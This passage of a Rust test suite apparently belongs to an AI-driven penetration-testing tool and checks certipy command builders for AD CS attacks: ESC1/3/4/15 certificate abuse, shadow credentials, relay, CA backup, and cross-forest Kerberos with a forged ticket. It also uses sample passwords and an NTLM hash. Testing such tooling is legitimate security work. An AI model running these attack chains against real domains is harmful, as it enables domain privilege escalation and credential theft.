            "ca": "contoso-CA01-CA",
            "dc_ip": "192.168.58.10",
            "request_id": 3348
        });
        let out_of = |cmd: super::CommandBuilder| {
            let argv = cmd.args_for_test();
            let idx = argv.iter().position(|a| a == "-out").unwrap();
            argv[idx + 1].clone()
        };
        let first = out_of(super::build_certipy_retrieve_command(&args).unwrap());
        let second = out_of(super::build_certipy_retrieve_command(&args).unwrap());
        assert!(first.contains("3348"), "got {first}");
        assert_ne!(
            first, second,
            "two retrievals of one pending request must not race onto a single \
             file — the loser answers an overwrite prompt it cannot see"
        );
    }

    #[test]
    fn certipy_output_names_cannot_repeat_inside_one_operation() {
        let names: std::collections::HashSet<String> = (0..64)
            .map(|_| {
                let cmd = super::build_certipy_request_command(&json!({
                    "username": "alice",
                    "domain": "contoso.local",
                    "password": "P@ssw0rd!",
                    "ca": "contoso-CA01-CA",
                    "template": "User",
                    "dc_ip": "192.168.58.10"
                }))
                .unwrap();
                let argv = cmd.args_for_test();
                let idx = argv.iter().position(|a| a == "-out").unwrap();
                argv[idx + 1].clone()
            })
            .collect();
        assert_eq!(
            names.len(),
            64,
            "a millisecond stamp alone repeats under load"
        );
    }

    #[test]
    fn certipy_auth_takes_an_explicit_pfx_password() {
        let args = json!({
            "pfx_path": "/tmp/operator_chosen.pfx",
            "pfx_password": "OperatorChosen1!",
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        assert_eq!(
            certipy_auth_flag(&args, "-password").as_deref(),
            Some("OperatorChosen1!")
        );
    }

    #[test]
    fn certipy_auth_keeps_the_pfx_path_readable_but_masks_the_passphrase() {
        let args = json!({
            "pfx_path": SHADOW_CRED_PFX,
            "dc_ip": "192.168.58.10",
            "domain": "contoso.local"
        });
        let line = super::build_certipy_auth(&args)
            .unwrap()
            .redacted_command_line();
        assert!(line.contains(SHADOW_CRED_PFX));
        assert!(line.contains("-username svc_sql"));
        assert!(!line.contains(crate::acl::SHADOW_CRED_PFX_PASSPHRASE));
    }

    // --- certipy_shadow ---

    #[test]
    fn certipy_shadow_missing_target() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "target").is_err());
    }

    #[test]
    fn certipy_shadow_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "target": "dc01$",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    #[test]
    fn certipy_shadow_empty_hashes_falls_back_to_password() {
        // The LLM has been observed sending `hashes=""` when only a password
        // is available — without the empty-string filter, certipy receives
        // `-hashes ''` and bails with "invalid hash format". The filter at
        // the top of `certipy_shadow` must treat empty hashes as missing so
        // the password branch runs.
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "hashes": "",
            "target": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        // Mirror the same filter used in `certipy_shadow` itself.
        let hashes = optional_str(&args, "hashes").filter(|s| !s.is_empty());
        assert!(
            hashes.is_none(),
            "empty hashes should be treated as missing"
        );
        // password fallback must still resolve.
        assert!(required_str(&args, "password").is_ok());
    }

    #[test]
    fn certipy_shadow_present_hashes_used() {
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "hashes": "aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c",
            "target": "Administrator",
            "dc_ip": "192.168.58.10"
        });
        let hashes = optional_str(&args, "hashes").filter(|s| !s.is_empty());
        assert!(hashes.is_some());
    }

    // --- certipy_template_esc4 ---

    #[test]
    fn certipy_template_esc4_missing_template() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "template").is_err());
    }

    #[test]
    fn certipy_template_esc4_user_at_domain_format() {
        let args = json!({
            "username": "admin",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "template": "ESC4Template",
            "dc_ip": "192.168.58.10"
        });
        let username = required_str(&args, "username").unwrap();
        let domain = required_str(&args, "domain").unwrap();
        let user_at_domain = format!("{username}@{domain}");
        assert_eq!(user_at_domain, "admin@contoso.local");
    }

    // --- certipy_esc3_full_chain (arg-shape) ---

    #[test]
    fn certipy_esc3_full_chain_requires_agent_template() {
        // Without `agent_template` we can't enroll the CRA cert in step 1 —
        // step 2's `-on-behalf-of` would have nothing to sign with.
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "CONTOSO-CA",
            "dc_ip": "192.168.58.10"
        });
        assert!(required_str(&args, "agent_template").is_err());
    }

    #[test]
    fn certipy_esc3_full_chain_on_behalf_template_defaults_to_user() {
        // The on-behalf target template defaults to "User" — the universal
        // client-auth template that any DA can normally enroll. Caller may
        // override for labs that wire ESC3 to a custom CRA template.
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "CONTOSO-CA",
            "dc_ip": "192.168.58.10",
            "agent_template": "ESC3"
        });
        let on_behalf_template = optional_str(&args, "on_behalf_template").unwrap_or("User");
        assert_eq!(on_behalf_template, "User");
    }

    #[test]
    fn certipy_esc3_full_chain_on_behalf_of_defaults_to_administrator() {
        let args = json!({
            "username": "alice",
            "domain": "contoso.local",
            "password": "P@ssw0rd!",
            "ca": "CONTOSO-CA",
            "dc_ip": "192.168.58.10",
            "agent_template": "ESC3"
        });
        let on_behalf_of = optional_str(&args, "on_behalf_of").unwrap_or("administrator");
        assert_eq!(on_behalf_of, "administrator");
    }

    #[test]
    fn certipy_esc3_full_chain_on_behalf_target_format() {
        // certipy's `-on-behalf-of` needs `NETBIOS\principal`, NOT the FQDN —
        // an FQDN there makes the CA policy module deny the request. Derive the
        // NetBIOS name from the first DNS label, uppercased; an explicit
        // nt_domain/flat_name overrides.
        let args = json!({});
        assert_eq!(
            super::on_behalf_nt_domain(&args, "contoso.local"),
            "CONTOSO"
        );
        assert_eq!(
            super::on_behalf_nt_domain(&args, "child.contoso.local"),
            "CHILD"
        );
        let ov = json!({"nt_domain": "FABRIKAM"});
        assert_eq!(super::on_behalf_nt_domain(&ov, "contoso.local"), "FABRIKAM");
        // The final -on-behalf-of is NETBIOS\principal: one backslash, no FQDN.
        let target = format!(
            "{}\\administrator",
            super::on_behalf_nt_domain(&args, "contoso.local")
        );
        assert_eq!(target, "CONTOSO\\administrator");
        assert_eq!(target.matches('\\').count(), 1);
        assert!(
            !target.split('\\').next().unwrap().contains('.'),
            "domain part must not be an FQDN"
        );
    }

    #[test]
    fn certipy_esc3_full_chain_target_falls_through_aliases() {
        // The CA host can arrive under any of `target`, `ca_host`, or
        // `target_ip` depending on which automation built the args.
        let args = json!({
            "ca_host": "192.168.58.50"
        });
        let target = optional_str(&args, "target")
            .or_else(|| optional_str(&args, "ca_host"))
            .or_else(|| optional_str(&args, "target_ip"));
        assert_eq!(target, Some("192.168.58.50"));

        let args2 = json!({
            "target_ip": "192.168.58.51"
        });
        let target2 = optional_str(&args2, "target")
            .or_else(|| optional_str(&args2, "ca_host"))
            .or_else(|| optional_str(&args2, "target_ip"));
        assert_eq!(target2, Some("192.168.58.51"));
    }

    // --- mock executor tests ---

    use crate::executor::mock;

    #[tokio::test]
    async fn certipy_find_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_find_vulnerable_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "dc_ip": "192.168.58.1", "vulnerable": true
        });
        assert!(super::certipy_find(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_upn_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC1",
            "dc_ip": "192.168.58.1", "upn": "administrator@contoso.local"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_auth_executes() {
        mock::push(mock::success());
        let args = json!({
            "pfx_path": "/tmp/admin.pfx", "dc_ip": "192.168.58.1",
            "domain": "contoso.local"
        });
        assert!(super::certipy_auth(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_shadow_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "target": "dc01$", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_shadow(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_template_esc4_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1"
        });
        assert!(super::certipy_template_esc4(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_relay_executes() {
        mock::push(mock::success());
        let args = json!({
            "target": "rpc://192.168.58.10", "ca": "contoso-CA"
        });
        assert!(super::certipy_relay(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_request_with_application_policies_executes() {
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "ca": "contoso-CA", "template": "ESC15",
            "dc_ip": "192.168.58.1",
            "application_policies": "1.3.6.1.5.5.7.3.2"
        });
        assert!(super::certipy_request(&args).await.is_ok());
    }

    #[tokio::test]
    async fn certipy_esc4_full_chain_executes() {
        // 3 execute calls: template, request, auth
        mock::push(mock::success());
        mock::push(mock::success());
        mock::push(mock::success());
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ss", "template": "ESC4", "dc_ip": "192.168.58.1",
            "ca": "contoso-CA", "pfx_path": "/tmp/admin.pfx"
        });
        assert!(super::certipy_esc4_full_chain(&args).await.is_ok());
    }

    // --- cross-forest Kerberos wiring (Bug B, certipy subset) ---

    // A forged inter-realm ccache for a contoso.local -> fabrikam.local trust.
    const XFOREST_CCACHE: &str =
        "/tmp/ares-tickets/contoso_local__fabrikam_local__Administrator.ccache";

    #[test]
    fn certipy_find_uses_kerberos_when_ticket_path_present() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "dc_ip": "192.168.58.240", "ticket_path": XFOREST_CCACHE
        });
        let cmd = super::build_certipy_find_command(&args)
            .unwrap()
            .expect("ticket_path must yield a command, not a soft-skip");
        let a = cmd.args_for_test();
        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
        assert!(
            a.iter().any(|x| x == "-no-pass"),
            "expected -no-pass: {a:?}"
        );
        assert!(
            a.iter().all(|x| x != "-p" && x != "-hashes"),
            "no password/hash flags in Kerberos mode: {a:?}"
        );
        let envs = cmd.env_vars_for_test();
        assert!(
            envs.iter()
                .any(|(k, v)| k == "KRB5CCNAME" && v == XFOREST_CCACHE),
            "KRB5CCNAME must export the ccache: {envs:?}"
        );
    }

    #[test]
    fn certipy_find_passes_dc_host_as_target_under_kerberos() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "dc_ip": "192.168.58.240", "dc_host": "dc01.fabrikam.local",
            "ticket_path": XFOREST_CCACHE
        });
        let cmd = super::build_certipy_find_command(&args).unwrap().unwrap();
        let a = cmd.args_for_test();
        let target = a
            .iter()
            .position(|x| x == "-target")
            .expect("expected -target: {a:?}");
        assert_eq!(a[target + 1], "dc01.fabrikam.local");
    }

    #[test]
    fn certipy_find_omits_target_without_dc_host() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "dc_ip": "192.168.58.240", "ticket_path": XFOREST_CCACHE
        });
        let cmd = super::build_certipy_find_command(&args).unwrap().unwrap();
        assert!(cmd.args_for_test().iter().all(|x| x != "-target"));
    }

    #[test]
    fn certipy_find_omits_target_on_password_path() {
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ssw0rd!", "dc_ip": "192.168.58.240",
            "dc_host": "dc01.contoso.local"
        });
        let cmd = super::build_certipy_find_command(&args).unwrap().unwrap();
        assert!(cmd.args_for_test().iter().all(|x| x != "-target"));
    }

    #[test]
    fn certipy_shadow_targets_dc_host_not_the_shadowed_account() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "target": "dc02$", "dc_ip": "192.168.58.240",
            "dc_host": "dc01.fabrikam.local", "ticket_path": XFOREST_CCACHE
        });
        let cmd = super::build_certipy_shadow_command(&args).unwrap();
        let a = cmd.args_for_test();
        let target = a
            .iter()
            .position(|x| x == "-target")
            .expect("expected -target");
        assert_eq!(a[target + 1], "dc01.fabrikam.local");
        let account = a
            .iter()
            .position(|x| x == "-account")
            .expect("expected -account");
        assert_eq!(a[account + 1], "dc02$");
    }

    #[test]
    fn certipy_ccache_falls_back_when_no_rehomed_sibling() {
        let dir = tempfile::tempdir().unwrap();
        let cc = dir
            .path()
            .join("contoso_local__fabrikam_local__Administrator.ccache");
        std::fs::write(&cc, b"ccache").unwrap();
        assert_eq!(
            super::certipy_consumable_ccache(&cc.to_string_lossy()),
            cc.to_string_lossy()
        );
    }

    #[test]
    fn certipy_ccache_prefers_rehomed_sibling() {
        let dir = tempfile::tempdir().unwrap();
        let cc = dir
            .path()
            .join("contoso_local__fabrikam_local__Administrator.ccache");
        std::fs::write(&cc, b"ccache").unwrap();
        let rehomed = crate::privesc::trust::certipy_ccache_path_for(&cc);
        std::fs::write(&rehomed, b"rehomed").unwrap();
        assert_eq!(
            super::certipy_consumable_ccache(&cc.to_string_lossy()),
            rehomed.to_string_lossy()
        );
    }

    #[test]
    fn certipy_kerberos_env_points_at_rehomed_sibling_and_its_shim() {
        let dir = tempfile::tempdir().unwrap();
        let cc = dir
            .path()
            .join("contoso_local__fabrikam_local__Administrator.ccache");
        std::fs::write(&cc, b"ccache").unwrap();
        let rehomed = crate::privesc::trust::certipy_ccache_path_for(&cc);
        std::fs::write(&rehomed, b"rehomed").unwrap();

        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "dc_ip": "192.168.58.240", "ticket_path": cc.to_string_lossy()
        });
        let cmd = super::build_certipy_find_command(&args).unwrap().unwrap();
        let envs = cmd.env_vars_for_test();
        let ccname = envs.iter().find(|(k, _)| k == "KRB5CCNAME").unwrap();
        let config = envs.iter().find(|(k, _)| k == "KRB5_CONFIG").unwrap();
        assert_eq!(ccname.1, rehomed.to_string_lossy());
        assert!(
            config
                .1
                .starts_with(&format!("{}.krb5.conf:", rehomed.to_string_lossy())),
            "KRB5_CONFIG must follow the sibling: {config:?}"
        );
    }

    #[test]
    fn certipy_find_uses_password_without_ticket() {
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "password": "P@ssw0rd!", "dc_ip": "192.168.58.240"
        });
        let cmd = super::build_certipy_find_command(&args).unwrap().unwrap();
        let a = cmd.args_for_test();
        assert!(a.iter().any(|x| x == "-p"), "expected -p: {a:?}");
        assert!(a.iter().all(|x| x != "-k"), "no -k without a ticket: {a:?}");
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .all(|(k, _)| k != "KRB5CCNAME"));
    }

    #[test]
    fn certipy_find_no_auth_returns_none() {
        // No password, hash, or ticket — the wrapper soft-skips.
        let args = json!({
            "username": "admin", "domain": "contoso.local", "dc_ip": "192.168.58.240"
        });
        assert!(super::build_certipy_find_command(&args).unwrap().is_none());
    }

    #[test]
    fn certipy_request_ticket_only_authenticates() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "ca": "fabrikam-CA", "template": "User", "dc_ip": "192.168.58.240",
            "ticket_path": XFOREST_CCACHE
        });
        let cmd = super::build_certipy_request_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
        assert!(
            a.iter().any(|x| x == "-no-pass"),
            "expected -no-pass: {a:?}"
        );
        assert!(
            a.iter().all(|x| x != "-password"),
            "no -password in Kerberos mode: {a:?}"
        );
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, _)| k == "KRB5CCNAME"));
    }

    #[test]
    fn certipy_request_requires_password_or_ticket() {
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "ca": "contoso-CA", "template": "ESC1", "dc_ip": "192.168.58.240"
        });
        let err = match super::build_certipy_request_command(&args) {
            Ok(_) => panic!("expected an error when neither password nor ticket_path is present"),
            Err(e) => e.to_string(),
        };
        assert!(
            err.contains("password or cross-forest ticket_path"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn certipy_ca_ticket_only_authenticates() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "dc_ip": "192.168.58.240", "ca": "fabrikam-CA", "backup": true,
            "ticket_path": XFOREST_CCACHE
        });
        let cmd = super::build_certipy_ca_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
        assert!(
            a.iter().any(|x| x == "-backup"),
            "backup flag preserved: {a:?}"
        );
        assert!(
            a.iter().all(|x| x != "-password"),
            "no -password in Kerberos mode: {a:?}"
        );
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, _)| k == "KRB5CCNAME"));
    }

    #[test]
    fn certipy_ca_requires_password_or_ticket() {
        let args = json!({
            "username": "admin", "domain": "contoso.local",
            "dc_ip": "192.168.58.240", "ca": "contoso-CA", "backup": true
        });
        let err = match super::build_certipy_ca_command(&args) {
            Ok(_) => panic!("expected an error when neither password nor ticket_path is present"),
            Err(e) => e.to_string(),
        };
        assert!(
            err.contains("password or cross-forest ticket_path"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn certipy_shadow_prefers_ticket_over_password() {
        let args = json!({
            "username": "administrator", "domain": "fabrikam.local",
            "target": "ws01$", "dc_ip": "192.168.58.240",
            "ticket_path": XFOREST_CCACHE, "password": "ignored-in-kerberos-mode"
        });
        let cmd = super::build_certipy_shadow_command(&args).unwrap();
        let a = cmd.args_for_test();
        assert!(a.iter().any(|x| x == "-k"), "expected -k: {a:?}");
        assert!(
            a.iter().all(|x| x != "-password"),
            "ticket must shadow the password: {a:?}"
        );
        assert!(cmd
            .env_vars_for_test()
            .iter()
            .any(|(k, _)| k == "KRB5CCNAME"));
    }

    // --- render_chain_output ---

    #[tokio::test]
    async fn remove_ccache_files_deletes_every_ccache_in_dir() {
        let dir = tempfile::tempdir().unwrap();
        for name in [
            "alice.ccache",
            "svc_sql.ccache",
            "dc01.contoso.local.ccache",
        ] {
            std::fs::write(dir.path().join(name), b"ticket").unwrap();
        }
        super::remove_ccache_files(Some(dir.path())).await;
        let left: Vec<_> = std::fs::read_dir(dir.path())
            .unwrap()
            .map(|e| e.unwrap().file_name())
            .collect();
        assert!(left.is_empty(), "ccache files survived: {left:?}");
    }

    #[tokio::test]
    async fn remove_ccache_files_leaves_non_ccache_files_alone() {
        let dir = tempfile::tempdir().unwrap();
        for name in [
            "admin.ccache",
            "esc1_1.pfx",
            "esc1_1.key",
            "notes.txt",
            "bob",
        ] {
            std::fs::write(dir.path().join(name), b"x").unwrap();
        }
        super::remove_ccache_files(Some(dir.path())).await;
        assert!(!dir.path().join("admin.ccache").exists());
        for name in ["esc1_1.pfx", "esc1_1.key", "notes.txt", "bob"] {
            assert!(dir.path().join(name).exists(), "{name} was deleted");
        }
    }

    #[tokio::test]
    async fn remove_ccache_files_on_empty_dir_is_a_noop() {
        let dir = tempfile::tempdir().unwrap();
        super::remove_ccache_files(Some(dir.path())).await;
        assert!(dir.path().is_dir());
        assert_eq!(std::fs::read_dir(dir.path()).unwrap().count(), 0);
    }

    #[tokio::test]
    async fn remove_ccache_files_ignores_a_missing_dir() {
        let dir = tempfile::tempdir().unwrap();
        let missing = dir.path().join("no_such_workdir");
        super::remove_ccache_files(Some(&missing)).await;
        assert!(!missing.exists());
    }

    fn mk_output(stdout: &str, stderr: &str) -> crate::ToolOutput {
        crate::ToolOutput {
            stdout: stdout.into(),
            stderr: stderr.into(),
            exit_code: Some(0),
            success: true,
        }
    }

    #[test]
    fn render_chain_output_concatenates_steps_under_labeled_headers() {
        let a = mk_output("alpha-out", "alpha-err");
        let b = mk_output("bravo-out", "bravo-err");
        let (stdout, stderr) = super::render_chain_output(&[("Alpha", &a), ("Bravo", &b)]);
        assert_eq!(stdout, "=== Alpha ===\nalpha-out\n=== Bravo ===\nbravo-out");
        assert_eq!(stderr, "=== Alpha ===\nalpha-err\n=== Bravo ===\nbravo-err");
    }

    #[test]
    fn render_chain_output_empty_steps_yields_empty_strings() {
        let (stdout, stderr) = super::render_chain_output(&[]);
        assert!(stdout.is_empty());
        assert!(stderr.is_empty());
    }

    #[test]
    fn render_chain_output_single_step_omits_join_separator() {
        let only = mk_output("solo-out", "solo-err");
        let (stdout, stderr) = super::render_chain_output(&[("Only", &only)]);
        assert_eq!(stdout, "=== Only ===\nsolo-out");
        assert_eq!(stderr, "=== Only ===\nsolo-err");
    }

    #[test]
    fn render_chain_output_preserves_step_order() {
        let first = mk_output("1", "");
        let second = mk_output("2", "");
        let third = mk_output("3", "");
        let (stdout, _) = super::render_chain_output(&[
            ("first", &first),
            ("second", &second),
            ("third", &third),
        ]);
        let first_idx = stdout.find("first").unwrap();
        let second_idx = stdout.find("second").unwrap();
        let third_idx = stdout.find("third").unwrap();
        assert!(first_idx < second_idx);
        assert!(second_idx < third_idx);
    }

    #[test]
    fn render_chain_output_handles_empty_stdout_or_stderr_fields() {
        let out_only = mk_output("data", "");
        let err_only = mk_output("", "boom");
        let (stdout, stderr) =
            super::render_chain_output(&[("Out", &out_only), ("Err", &err_only)]);
        assert_eq!(stdout, "=== Out ===\ndata\n=== Err ===\n");
        assert_eq!(stderr, "=== Out ===\n\n=== Err ===\nboom");
    }
}
